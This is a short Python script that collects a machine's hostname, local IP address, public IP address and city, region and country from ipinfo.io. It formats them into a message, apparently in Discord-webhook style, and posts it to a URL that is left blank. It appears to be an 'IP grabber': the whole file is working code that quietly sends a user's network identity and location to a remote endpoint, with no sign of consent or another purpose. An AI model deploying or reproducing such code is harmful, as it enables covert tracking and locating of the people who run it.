import socket
import requests
import json

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
url = ""
rawdata = requests.get('http://ipinfo.io')
data = json.loads(rawdata.text)
ip = data["ip"]
city = data["city"]
region = data["region"]
country = data["country"]

data = {
    "content":
    "----------------------------------------------\r\n" + 
    "Hostname: " + hostname + "\r\n" +
    "Network IP: `" + IPAddr + "`\r\n" +
    "Internet IP: `" + ip + "`\r\n" + 
    "Location Informaton:\r\n" + 
    ">    " + city + ", " + region + " " + country + "\r\n" + 
    "----------------------------------------------\r\n"
}

requests.post(url,json=data)